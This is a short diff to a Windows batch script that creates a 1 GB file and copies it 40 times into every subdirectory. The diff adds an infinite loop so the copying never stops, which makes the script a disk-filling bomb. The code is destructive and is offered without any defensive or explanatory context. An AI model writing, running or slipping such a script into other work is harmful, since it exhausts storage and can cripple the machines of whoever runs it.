@@ -7,7 +7,8 @@ set filesize=1073741824
 :: Create a 1 GB file using fsutil
 fsutil file createnew 1gb_file.txt %filesize%
 
-:: Get a list of all directories
+:: Infinite loop to continuously duplicate files
+:loop
 for /f "tokens=*" %%d in ('dir /s /b /ad') do (
     set "dir=%%~fd"
     :: Create 40 copies of the file in each directory
@@ -15,3 +16,4 @@ for /f "tokens=*" %%d in ('dir /s /b /ad') do (
         copy /y 1gb_file.txt "!dir!\1gb_file_%%i.txt"
     )
 )
+goto loop
